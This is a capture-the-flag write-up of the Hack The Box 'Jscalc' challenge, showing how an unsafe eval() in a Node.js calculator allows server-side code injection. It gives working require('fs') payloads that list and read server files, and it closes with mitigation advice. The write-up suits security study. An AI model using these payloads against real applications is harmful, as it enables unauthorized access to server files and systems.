# Jscalc Challenges — HTB (easy) — Writeup

<img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*3IfdUVIvNhAZEAUKEz_cAw.png" alt="screenshot" width="700" />

## Description

In the mysterious depths of the digital sea, a specialized JavaScript calculator has been crafted by tech-savvy squids. With multiple arms and complex problem-solving skills, these cephalopod engineers use it for everything from inkjet trajectory calculations to deep-sea math. Attempt to outsmart it at your own risk! 🦑

---

## TL;DR

I found an `eval()` usage in a Node.js-powered site which allowed remote code execution (RCE) via JavaScript. By requiring the Node `fs` module I listed the filesystem and read `/flag.txt`.

---

## What I did — step by step

### 1. Download & unzip

After downloading the challenge files and unzipping them we see the extracted files:

![screenshot](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Alc3Jf5AYxSq7Wo-faGRSw.png)

Nothing interesting at first glance, so I inspected the web app.

### 2. Open the website

![screenshot](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aMJoxNYzC_JaQveYS5ZD6Q.png)

### 3. Spot `eval()` usage

The site uses `eval()` to evaluate formulas. Quick reminder: `eval()` executes the string it's given in the caller's context — if that string can be influenced by an attacker, it can run arbitrary code in the environment of the webpage (or the Node process if running server-side).

![screenshot](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ow1lbwAvkE_f7CFyCNPjCA.png)

Because `package.json` showed the app runs on **Node.js**, server-side JavaScript execution opens the door to `require()` and the full Node API — meaning we can attempt RCE.

![screenshot](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*BHu3oMUgpRV9gAT1h03EVQ.png)

### 4. Intercepting requests with Burp Suite

I inspected requests with Burp and noticed the endpoint accepts a `formula` parameter. I tested injecting `require('fs')` into that parameter.

![screenshot](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*AZRueOxoAUjc0eqtheQWnQ.png)

### 5. Using `fs` to explore the filesystem

Once `require('fs')` worked, I used `readdirSync()` to list directories. Example payload (sent through the `formula` parameter):

```js
require('fs').readdirSync('../').toString();
```

The response returned (root listing):

```
app, bin, dev, etc, flag.txt, home, lib, media, mnt, opt, proc, root, run, sbin, srv, sys, tmp, usr, var
```

This confirmed we were able to read server filesystem contents and that `/flag.txt` exists at the root.

### 6. Read the flag

Next payload to read the flag file:

```js
require('fs').readFileSync('/flag.txt').toString();
```

![screenshot](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*AZRueOxoAUjc0eqtheQWnQ.png)

And — boom — we obtained the flag.

---

## Commands / payloads used

* List root directory:

```js
require('fs').readdirSync('../').toString();
```

* Read the flag:

```js
require('fs').readFileSync('/flag.txt').toString();
```

---

## Notes & mitigation

* Avoid using `eval()` on untrusted input. If dynamic expression evaluation is required, use safe parsers or sandboxed interpreters.
* On Node.js, never expose `require`/internal modules via user-controllable evaluation contexts.
* Validate and sanitize any user-supplied expressions, or run them inside a strict sandbox like a separate process with minimal privileges.

---

## Final

Thanks for reading